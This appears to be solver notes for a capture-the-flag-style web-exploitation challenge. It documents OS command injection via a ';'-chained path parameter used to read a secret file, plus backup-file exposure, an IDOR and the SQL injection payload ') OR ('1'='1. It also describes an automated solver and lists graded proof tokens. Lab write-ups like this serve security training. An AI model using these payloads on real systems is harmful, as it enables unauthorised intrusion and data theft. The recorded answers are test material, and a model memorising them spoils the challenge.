---
day: 16
slug: "shell-company"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

# web-exploitation-day-16-shell-company (release day 25)

All three modes CORRECT: `single_solve`, `time_trial`, `mastery`.

## New bug class: OS command injection via a shell-concatenated path parameter

`GET /api/clues` on a Gin (Go) app discloses:

```json
{"current_role": "analyst", "example_path": "/app/static",
 "feature_route": "/process-<hex>"|"/execute-<hex>", "framework": "Gin",
 "input_parameter": "path"}
```

`GET <feature_route>` with no query -> `400 {"error":"path_required","example_path":"/app/static"}`.
`GET <feature_route>?path=/app/static` -> `200
{"effect":"worker_command_completed","ok":true,"stdout":"drwxr-xr-x ... /app/static"}` —
the `stdout` is an `ls -l`-shaped directory listing, so the server is building
something like `ls -l <path>` (or similar) and running it through a shell
without escaping.

**The injection**: appending `; <command>` to the `path` value runs
`<command>` as a second shell statement and its stdout gets appended to the
same `stdout` field, e.g.:

```
?path=/app/static; id
-> stdout: "...static\nuid=10001(arena) gid=10001(arena) groups=10001(arena)"
```

Command substitution (`$(...)`) inside the query value was tried and
rejected outright by the server with `{"error":"diagnostic_failed"}` on
every target tried (single_solve, time_trial, and the mastery command-
injection target) — **use plain `;`-separated command chaining, never
`$(...)` substitution.**

The proof is not reflected directly by any single command — it has to be
read from a file. `env` (run via the injection, e.g.
`?path=/app/static; env`) discloses:

```
SHLVL=1
HOME=/home/arena
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OBJECTIVE_PATH=/run/huntress/objective.txt
PWD=/app
```

`?path=/app/static; cat /run/huntress/objective.txt` (or `$OBJECTIVE_PATH`)
-> `stdout` contains `proof_<hex>` directly. This is the generic recovery:
read `feature_route`/`input_parameter`/`example_path` from `/api/clues`,
then request `<feature_route>?<input_parameter>=<example_path>; cat
$OBJECTIVE_PATH` and extract `proof_<hex>` from `stdout`. Confirmed on 3
independent live variants (single_solve, time_trial, and the mastery target
of this same class) with 3 different `feature_route` hex suffixes.

`solve.py <target_base_url>` does exactly this by default
(`solve_command_injection`).

## Mastery: 4 independently-classified targets (cumulative, as expected)

Per `docs/web-worker-lessons.md`, mastery mixes earlier bug classes — none of
this family's other 3 targets were command injection:

1. **Target 1 — "Green Light"** (tiny native Node.js HTTP server), **backup
   exposure**. Root HTML has `<!-- deployment note: remember to review
   crawler policy before launch -->`. `/robots.txt` ->
   `Disallow: /archives-fa2ae/`; that path is an open directory index
   listing `environment-copy-b29d58.json.bak` and `release-notes.txt`; the
   `.bak` file's JSON body has `{"environment":"production",
   "support_note":"proof_47c5a6a68e314790a7eba29cccf5ee1e"}`. Same pattern as
   `recovery_lib.rec_backup`.

2. **Target 2 — "Pocket SOC"**, **IDOR**. Root page ("Signed in as Morgan")
   auto-issues a session cookie and lists Morgan's own case ids (1557, 8903,
   5260) with links to `/briefs/<id>`, which fetches `/api/briefs/<id>`
   client-side. `GET /api/activity` (the "activity feed" link) discloses a
   foreign case id (`17329`, `owner":"executive"`,
   `visibility":"reference_only"`) mixed in with Morgan's own events.
   `GET /api/briefs/17329` with the same cookie (no ownership check) ->
   `{"id":17329,"owner":"executive","title":"Legal hold","status":"restricted","note":"proof_777322d815624588ac4e0feae1584e40"}`.
   Same app/pattern as `recovery_lib.rec_idor` ("Incident Picnic"-shaped app,
   different name/theme this time — "Pocket SOC").

3. **Target 3 — "Archive Atlas"**, **SQL injection (group-closing
   boolean)**. `GET /search?q=<term>` search form over a quoted LIKE clause.
   A plain `) OR (1=1` payload (no quote) returned "Nothing matched" — the
   query substitutes `q` inside an already-quoted LIKE expression, same as
   day-19/day-24's "Query Me This" app design. The **exact day-19 payload**
   `q = ') OR ('1'='1` (reused verbatim, per `web-worker-lessons.md`'s
   standing advice to try this first for any `/search?q=`/`/lookup?q=`
   surface) worked and surfaced a `restricted`-pill record: "Executive
   timeline ... proof_f3f70f7baddf407f8809cad95644d162" (Record 13738) among
   the normal 3 records. Comment-based and plain `' OR '1'='1` were **not**
   tried here since the exact reused payload worked first try — consistent
   with prior notes that those variants fail against this app shape.

4. **Target 4** — this family's own command-injection class, different
   `feature_route` hex suffix (`/execute-a51402`), same method ->
   `proof_01e2635487744785a8f4adcf63a964a8`.

All 4 recovered independently, submitted in one `wk.py submit mastery` call
-> `CORRECT`.

## Graded

- **single_solve**: CORRECT — `proof_c82bf62795974d7793a3c743b29e5def`
  (feature_route `/process-38db5f`).
- **time_trial**: CORRECT — `proof_5708e3a9ce7c48228aa52f922bc7ddac`
  (feature_route `/execute-500cbc`). Untimed-only per pipeline policy;
  `wk.py` never set `run_for_time`.
- **mastery**: CORRECT — 4 targets, all 4 proofs above, submitted together.

## Reusable solver

`solve.py <target_base_url>` — command-injection recovery for this family's
own bug class by default (reads `/api/clues`, builds
`<feature_route>?<input_parameter>=<example_path>; cat $OBJECTIVE_PATH`,
extracts `proof_<hex>` from `stdout`). `solve.py <target_base_url>
--all-classes` runs a generic classifier (`classify_and_solve`) that also
tries backup exposure, IDOR, and the exact day-19 group-closing SQLi
payload, for use against an unclassified mastery target — same discipline
as `recovery_lib.classify_and_recover`, not yet folded into that shared
module (per the day-24 fetch-quest NOTES.md convention: port the logic here
first, let the coordinator consolidate into `recovery_lib.py` afterward).

A future `recovery_lib.py` consolidation could fold in:
1. `rec_command_injection(t, clues)`: this family's `;`-chaining-into-
   `$OBJECTIVE_PATH` recoverer.
2. `rec_sqli_group_close(t, html)`: a generalized `') OR ('1'='1` recoverer
   for any `/search`- or `/lookup`-style form (day-19's `sqli/solve.py` and
   day-24's fetch-quest NOTES.md both independently reused this same exact
   payload; it has now appeared in 3 separate release days against the same
   underlying app design and is worth promoting to the shared library).

## Gotchas

- `$(...)` command substitution inside the `path` query value is rejected
  server-side with `{"error":"diagnostic_failed"}` — only plain `;`-chained
  commands work. Don't waste requests on backtick/`$()` substitution forms.
- The proof is never reflected by the base command — it only shows up after
  `cat`-ing the file named by the `OBJECTIVE_PATH` env var (itself only
  visible by injecting `env`). Don't assume the first successful injection
  (e.g. `id`, `whoami`) carries the proof directly; it doesn't.
- Once a mode's attempt is submitted CORRECT, its live targets are torn down
  fast (HTTP 410 afterward) — this NOTES.md and the evidence files under
  `evidence/` were captured before each submit, per standing practice.
- No ENOSPC/socket-timeout issues hit this session (contrast with day-24).
